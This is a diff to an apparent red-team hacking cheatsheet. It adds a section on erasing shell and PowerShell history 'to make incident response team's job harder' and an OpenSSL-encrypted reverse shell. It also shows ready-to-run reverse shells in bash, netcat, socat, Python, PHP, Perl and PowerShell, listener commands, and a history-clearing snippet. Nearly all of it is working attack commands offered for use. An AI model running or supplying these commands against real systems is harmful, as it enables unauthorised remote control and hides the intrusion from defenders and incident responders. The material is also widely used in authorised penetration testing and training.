@@ -3,9 +3,9 @@
 Commands and short scripts that accomplish useful things for hacking/red teaming.
 
 Other great cheetsheets:
-[HackTricks](https://book.hacktricks.xyz/)
-[Red Team Experiments](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
-[Awesome Penetration Testing](https://github.com/enaqx/awesome-pentest)
+- [HackTricks](https://book.hacktricks.xyz/)
+- [Red Team Experiments](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
+- [Awesome Penetration Testing](https://github.com/enaqx/awesome-pentest)
 
 # 2. Table of Contents
 - [1. Hacking Cheatsheet](#1-hacking-cheatsheet)
@@ -36,16 +36,18 @@ Other great cheetsheets:
     - [4.2.5. Zip File Bruteforcing](#425-zip-file-bruteforcing)
   - [4.3. Port Knocking](#43-port-knocking)
   - [4.4. Reverse Shells](#44-reverse-shells)
-    - [4.4.1. Running a detached/daeminized process on Linux](#441-running-a-detacheddaeminized-process-on-linux)
-    - [4.4.2. Netcat Listener](#442-netcat-listener)
-    - [4.4.3. Socat Listener](#443-socat-listener)
-    - [4.4.4. Bash Reverse Shell](#444-bash-reverse-shell)
-    - [4.4.5. Netcat Reverse Shell](#445-netcat-reverse-shell)
-    - [4.4.6. Socat Reverse Shell](#446-socat-reverse-shell)
-    - [4.4.7. Python Reverse Shell](#447-python-reverse-shell)
-    - [4.4.8. PHP Reverse Shell](#448-php-reverse-shell)
-    - [4.4.9. Perl Reverse Shell](#449-perl-reverse-shell)
-    - [4.4.10. Powershell Reverse Shell](#4410-powershell-reverse-shell)
+    - [4.4.1. Covering your tracks](#441-covering-your-tracks)
+    - [4.4.2. Running a detached/daeminized process on Linux](#442-running-a-detacheddaeminized-process-on-linux)
+    - [4.4.3. Netcat Listener](#443-netcat-listener)
+    - [4.4.4. Socat Listener](#444-socat-listener)
+    - [4.4.5. Bash Reverse Shell](#445-bash-reverse-shell)
+    - [4.4.6. Netcat Reverse Shell](#446-netcat-reverse-shell)
+    - [4.4.7. Socat Reverse Shell](#447-socat-reverse-shell)
+    - [4.4.8. Python Reverse Shell](#448-python-reverse-shell)
+    - [4.4.9. PHP Reverse Shell](#449-php-reverse-shell)
+    - [4.4.10. Perl Reverse Shell](#4410-perl-reverse-shell)
+    - [4.4.11. Powershell Reverse Shell](#4411-powershell-reverse-shell)
+    - [4.4.12. OpenSSL Encrypted Reverse Shell](#4412-openssl-encrypted-reverse-shell)
   - [4.5. Encryption](#45-encryption)
     - [4.5.1. Create self-signed SSL/TLS certificate](#451-create-self-signed-ssltls-certificate)
 - [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
@@ -542,10 +544,28 @@ nc -z VICTIM_IP 22-24
 
 ## 4.4. Reverse Shells
 
-[Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-[Reverse Shell Generator](https://www.revshells.com/)
+- [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [Reverse Shell Generator](https://www.revshells.com/)
 
-### 4.4.1. Running a detached/daeminized process on Linux
+### 4.4.1. Covering your tracks
+
+When you connect via a reverse/bind shell, your commands get saved in the
+terminal history. To avoid logging this (to make incident response team's job
+harder), use the following as your first command:
+
+```sh
+# for zsh, bash, sh, etc.
+unset HISTFILE HISTSIZE HISTFILESIZE
+```
+
+```powershell
+# for Windows PowerShell
+Set-PSReadlineOption –HistorySaveStyle SaveNothing
+# - or -
+Remove-Module PSReadline
+```
+
+### 4.4.2. Running a detached/daeminized process on Linux
 
 When delivering a payload, sometimes it needs to run as a daemon so it doesn't
 die when the session/connection is closed. Normally you do this with `nohup`,
@@ -556,14 +576,14 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 ( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
 ```
 
-### 4.4.2. Netcat Listener
+### 4.4.3. Netcat Listener
 
 ```sh
 nc -vlnp LISTEN_PORT
 # on mac, exclude the "-p" flag
 ```
 
-### 4.4.3. Socat Listener
+### 4.4.4. Socat Listener
 
 ```sh
 # full tty over TCP
@@ -579,14 +599,14 @@ socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,ver
 
 Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)
 
-### 4.4.4. Bash Reverse Shell
+### 4.4.5. Bash Reverse Shell
 
 ```sh
 # only works on Linux
 bash -i >& /dev/tcp/LISTEN_IP/LISTEN_PORT 0>&1
 ```
 
-### 4.4.5. Netcat Reverse Shell
+### 4.4.6. Netcat Reverse Shell
 
 ```sh
 # if netcat has the -e flag:
@@ -596,7 +616,7 @@ nc -e /bin/sh 10.0.0.1 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
-### 4.4.6. Socat Reverse Shell
+### 4.4.7. Socat Reverse Shell
 
 ```sh
 # with full tty
@@ -609,32 +629,44 @@ socat EXEC:/bin/bash TCP:LISTEN_IP:LISTEN_PORT
 socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:LISTEN_PORT,verify=0
 ```
 
-### 4.4.7. Python Reverse Shell
+### 4.4.8. Python Reverse Shell
 
 ```sh
 python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",LISTEN_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
-### 4.4.8. PHP Reverse Shell
+### 4.4.9. PHP Reverse Shell
 
 ```sh
 # may have to try different socket numbers besides 3 (4,5,6...)
 php -r '$sock=fsockopen("LISTEN_IP",LISTEN_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### 4.4.9. Perl Reverse Shell
+### 4.4.10. Perl Reverse Shell
 
 ```sh
 perl -e 'use Socket;$i="LISTEN_IP";$p=LIISTEN_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-### 4.4.10. Powershell Reverse Shell
+### 4.4.11. Powershell Reverse Shell
 
 Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
 
 ```powershell
 New-Object System.Net.Sockets.TCPClient("LISTEN_IP",LISTEN_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+### 4.4.12. OpenSSL Encrypted Reverse Shell
+
+```sh
+# generate key on server
+openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
+# Start server listener
+openssl s_server -accept PORT -key key.pem -cert cert.pem
+
+# Client-side reverse shell
+rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:PORT -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
 ## 4.5. Encryption
@@ -1046,7 +1078,7 @@ powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1
 ```sh
 # unset history (shell command logging)
 export HISTFILE=
-unset HISTFILE HISTSIZE PROMPT_COMMAND
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
 export HISTCONTROL=ignorespace
 history -c
 
